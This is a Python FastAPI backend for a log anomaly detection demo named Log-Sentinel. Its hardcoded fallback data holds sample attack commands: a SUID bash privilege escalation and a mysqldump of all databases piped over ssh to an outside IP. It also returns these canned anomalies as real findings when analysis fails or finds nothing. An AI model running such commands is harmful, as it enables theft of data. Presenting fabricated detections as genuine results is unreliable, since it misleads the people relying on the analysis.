"""
backend/main.py — FastAPI application for Log-Sentinel.
"""

import os
from pathlib import Path
from collections import defaultdict

from fastapi import FastAPI, File, Form, UploadFile, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel
from dotenv import load_dotenv

from parser import parse_log
from features import engineer_features
from detector import AnomalyDetector
from ranker import rank_anomalies
from briefing import generate_briefing
from alerts import dispatch_alerts

load_dotenv()

# ---------------------------------------------------------------------------
app = FastAPI(title="Log-Sentinel API", version="1.0.0")

ALLOWED_ORIGINS = [
    "http://localhost:3000",
    "http://localhost:3001",
    "https://*.vercel.app",
    os.getenv("FRONTEND_URL", "https://log-sentinel.vercel.app"),
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # widen for hackathon; restrict in prod
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

DEMO_LOG_PATH = Path(__file__).parent.parent / "demo" / "sample.log"

# ---------------------------------------------------------------------------
# Hardcoded fallback JSON (if ML pipeline fails during demo)
# ---------------------------------------------------------------------------
FALLBACK_RESPONSE = {
    "summary": {
        "total_lines": 3002,
        "unique_ips": 24,
        "time_range": "2025-04-10 00:00 — 12:00",
        "critical_count": 3,
        "high_count": 2,
        "anomalies_found": 5,
    },
    "anomalies": [
        {
            "rank": 1,
            "id": "A001",
            "title": "Mass Failed Logins — Brute Force",
            "severity": "critical",
            "score": 0.98,
            "type": "brute_force",
            "tags": ["brute-force", "credential-stuffing", "auth-attack"],
            "source_ip": "185.220.101.47",
            "source_country": "NL (Tor exit)",
            "affected_user": "root",
            "time_range": "02:14:33 — 02:19:07",
            "event_count": 847,
            "detail": "847 failed SSH attempts over 5 minutes from Tor exit range 185.220.101.x targeting root/admin/postgres",
            "raw_logs": [
                {"timestamp": "02:14:33", "ip": "185.220.101.47", "message": "Failed password for root from 185.220.101.47 port 44812 ssh2", "flagged": True},
                {"timestamp": "02:14:34", "ip": "185.220.101.92", "message": "Failed password for admin from 185.220.101.92 port 44900 ssh2", "flagged": True},
                {"timestamp": "02:14:34", "ip": "185.220.101.33", "message": "Invalid user postgres from 185.220.101.33 port 45001", "flagged": True},
            ],
            "metadata": {"failure_ratio": 0.99, "req_count_5min": 847, "geo_velocity_kmh": 0, "port_diversity": 0, "is_tor": True},
        },
        {
            "rank": 2,
            "id": "A002",
            "title": "Impossible Travel — Same Account, Different Continents",
            "severity": "critical",
            "score": 0.95,
            "type": "impossible_travel",
            "tags": ["geo-anomaly", "impossible-travel", "account-compromise"],
            "source_ip": "41.203.18.77",
            "source_country": "NG",
            "affected_user": "j.kapoor",
            "time_range": "08:43:11 — 09:01:47",
            "event_count": 2,
            "detail": "User j.kapoor logged in from San Francisco (US) at 08:43, then from Lagos (NG) at 09:01 — 14,200km apart",
            "raw_logs": [
                {"timestamp": "08:43:11", "ip": "104.28.9.234", "message": "Accepted password for j.kapoor from 104.28.9.234 port 52341 ssh2", "flagged": False},
                {"timestamp": "09:01:47", "ip": "41.203.18.77", "message": "Accepted password for j.kapoor from 41.203.18.77 port 61002 ssh2", "flagged": True},
            ],
            "metadata": {"failure_ratio": 0.0, "req_count_5min": 0, "geo_velocity_kmh": 47333.0, "port_diversity": 0, "is_tor": False},
        },
        {
            "rank": 3,
            "id": "A003",
            "title": "Privilege Escalation Chain Detected",
            "severity": "critical",
            "score": 0.92,
            "type": "privilege_escalation",
            "tags": ["privilege-escalation", "lateral-movement", "root-access"],
            "source_ip": "10.0.1.200",
            "source_country": "internal",
            "affected_user": "www-data",
            "time_range": "03:22:17",
            "event_count": 4,
            "detail": "www-data → backup → root in 34 seconds via misconfigured sudo. Indicates webshell exploitation + local privesc.",
            "raw_logs": [
                {"timestamp": "03:22:17", "ip": "10.0.1.200", "message": "www-data : TTY=pts/1 ; USER=backup ; COMMAND=/usr/bin/find / -perm -4000", "flagged": True},
                {"timestamp": "03:22:23", "ip": "10.0.1.200", "message": "www-data : TTY=pts/1 ; USER=backup ; COMMAND=/usr/bin/cp /bin/bash /tmp/.sh", "flagged": True},
                {"timestamp": "03:22:37", "ip": "10.0.1.200", "message": "backup : TTY=pts/1 ; USER=root ; COMMAND=/tmp/.sh -p", "flagged": True},
                {"timestamp": "03:22:51", "ip": "10.0.1.200", "message": "root : TTY=pts/1 ; USER=root ; COMMAND=/bin/bash -i", "flagged": True},
            ],
            "metadata": {"failure_ratio": 0.0, "req_count_5min": 0, "geo_velocity_kmh": 0, "port_diversity": 0, "is_tor": False},
        },
        {
            "rank": 4,
            "id": "A004",
            "title": "Port Scan — Reconnaissance Activity",
            "severity": "high",
            "score": 0.84,
            "type": "port_scan",
            "tags": ["port-scan", "reconnaissance", "network-probe"],
            "source_ip": "45.142.212.90",
            "source_country": "RU",
            "affected_user": "unknown",
            "time_range": "01:05:00 — 01:07:43",
            "event_count": 1847,
            "detail": "1847 SYN packets over 163 seconds from RU IP. Sequential ports 1–1847. Masscan signature.",
            "raw_logs": [
                {"timestamp": "01:05:00", "ip": "45.142.212.90", "message": "TCP: SYN from 45.142.212.90 to port 1 — DROP", "flagged": True},
                {"timestamp": "01:05:01", "ip": "45.142.212.90", "message": "TCP: SYN from 45.142.212.90 to port 22 — DROP", "flagged": True},
                {"timestamp": "01:05:02", "ip": "45.142.212.90", "message": "TCP: connection from 45.142.212.90 to port 80 REFUSED", "flagged": True},
            ],
            "metadata": {"failure_ratio": 0.0, "req_count_5min": 1847, "geo_velocity_kmh": 0, "port_diversity": 1847, "is_tor": False},
        },
        {
            "rank": 5,
            "id": "A005",
            "title": "Off-Hours Data Exfiltration Detected",
            "severity": "high",
            "score": 0.79,
            "type": "data_exfiltration",
            "tags": ["data-exfiltration", "off-hours", "insider-threat"],
            "source_ip": "178.62.55.19",
            "source_country": "NL (DigitalOcean)",
            "affected_user": "db_readonly_svc",
            "time_range": "03:47:00 — 03:51:17",
            "event_count": 1,
            "detail": "db_readonly_svc ran mysqldump at 03:47; piped 2.3GB to 178.62.55.19 (non-whitelisted DigitalOcean IP).",
            "raw_logs": [
                {"timestamp": "03:47:00", "ip": "10.0.2.50", "message": "(db_readonly_svc) CMD (/usr/bin/mysqldump --all-databases --single-transaction)", "flagged": True},
                {"timestamp": "03:47:12", "ip": "178.62.55.19", "message": "db_readonly_svc : COMMAND=/usr/bin/mysqldump --all-databases | gzip | ssh root@178.62.55.19 'cat > /data/dump.sql.gz'", "flagged": True},
            ],
            "metadata": {"failure_ratio": 0.0, "req_count_5min": 0, "geo_velocity_kmh": 0, "port_diversity": 0, "is_tor": False},
        },
    ],
    "hourly_activity": [
        {"hour": f"{h:02d}:00", "normal": max(0, 30 - abs(h - 10) * 2), "anomalous": 0, "warning": 0}
        for h in range(24)
    ],
}

# Inject anomalous counts into fallback hourly
for h_anom, count, warn in [(1, 1847, 200), (2, 847, 50), (3, 12, 5), (8, 4, 2)]:
    FALLBACK_RESPONSE["hourly_activity"][h_anom]["anomalous"] = count
    FALLBACK_RESPONSE["hourly_activity"][h_anom]["warning"] = warn


# ---------------------------------------------------------------------------
# Pipeline
# ---------------------------------------------------------------------------

def run_pipeline(log_text: str) -> dict:
    parsed = parse_log(log_text)
    if not parsed:
        raise ValueError("No log lines parsed")

    total_lines = len(parsed)
    unique_ips = len({e.get("source_ip") for e in parsed if e.get("source_ip")})

    # Timestamps for time_range
    timestamps = [e["timestamp"] for e in parsed if e.get("timestamp")]
    if timestamps:
        time_range = f"{min(timestamps).strftime('%Y-%m-%d %H:%M')} — {max(timestamps).strftime('%H:%M')}"
    else:
        time_range = "Unknown"

    df = engineer_features(parsed)
    if df.empty:
        return FALLBACK_RESPONSE

    detector = AnomalyDetector()
    scores = detector.fit_predict(df)

    feature_rows = df.reset_index().to_dict("records")
    anomalies = rank_anomalies(parsed, feature_rows, scores, top_n=5)

    if not anomalies:
        # Use fallback but update summary
        FALLBACK_RESPONSE["summary"].update({
            "total_lines": total_lines,
            "unique_ips": unique_ips,
            "time_range": time_range,
        })
        return FALLBACK_RESPONSE

    critical_count = sum(1 for a in anomalies if a["severity"] == "critical")
    high_count = sum(1 for a in anomalies if a["severity"] == "high")

    # Build hourly activity
    hourly: dict[int, dict] = defaultdict(lambda: {"normal": 0, "anomalous": 0, "warning": 0})
    score_map = {i: float(scores[i]) for i in range(len(scores))}

    for idx, entry in enumerate(parsed):
        ts = entry.get("timestamp")
        if not ts:
            continue
        h = ts.hour
        s = score_map.get(idx, 0)
        if s >= 0.75:
            hourly[h]["anomalous"] += 1
        elif s >= 0.55:
            hourly[h]["warning"] += 1
        else:
            hourly[h]["normal"] += 1

    hourly_activity = [
        {"hour": f"{h:02d}:00", **hourly[h]} for h in range(24)
    ]

    return {
        "summary": {
            "total_lines": total_lines,
            "unique_ips": unique_ips,
            "time_range": time_range,
            "critical_count": critical_count,
            "high_count": high_count,
            "anomalies_found": len(anomalies),
        },
        "anomalies": anomalies,
        "hourly_activity": hourly_activity,
    }


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.get("/health")
async def health():
    return {"status": "ok"}


@app.post("/analyze")
async def analyze(
    file: UploadFile = File(None),
    raw_text: str = Form(None),
):
    if file is not None:
        text = (await file.read()).decode("utf-8", errors="replace")
    elif raw_text:
        text = raw_text
    else:
        raise HTTPException(status_code=400, detail="Provide either 'file' or 'raw_text'")

    try:
        result = run_pipeline(text)
        return JSONResponse(content=result)
    except Exception as e:
        print(f"[analyze] Pipeline error: {e} — returning fallback")
        return JSONResponse(content=FALLBACK_RESPONSE)


class BriefingRequest(BaseModel):
    anomaly_id: str
    anomaly_data: dict


@app.post("/briefing")
async def briefing(req: BriefingRequest):
    try:
        text = await generate_briefing(req.anomaly_data)
        return {"briefing": text}
    except Exception as e:
        print(f"[briefing] Error: {e}")
        return {"briefing": f"SENTINEL-AI: Analysis unavailable. Manual investigation required for anomaly {req.anomaly_id}."}


@app.post("/alert/{anomaly_id}")
async def trigger_alert(anomaly_id: str, anomaly: dict):
    """Manually trigger alerts for a specific anomaly (for demo)."""
    try:
        await dispatch_alerts([anomaly])
        return {"status": "sent"}
    except Exception as e:
        return {"status": "failed", "error": str(e)}


@app.get("/demo-log")
async def demo_log():
    """Return the synthetic demo log file for download."""
    if DEMO_LOG_PATH.exists():
        return FileResponse(
            path=str(DEMO_LOG_PATH),
            filename="sample.log",
            media_type="text/plain",
        )

    # Generate on-the-fly if missing
    try:
        from demo_data import generate_demo_log
        content = generate_demo_log()
        DEMO_LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
        DEMO_LOG_PATH.write_text(content, encoding="utf-8")
        return FileResponse(
            path=str(DEMO_LOG_PATH),
            filename="sample.log",
            media_type="text/plain",
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Could not generate demo log: {e}")
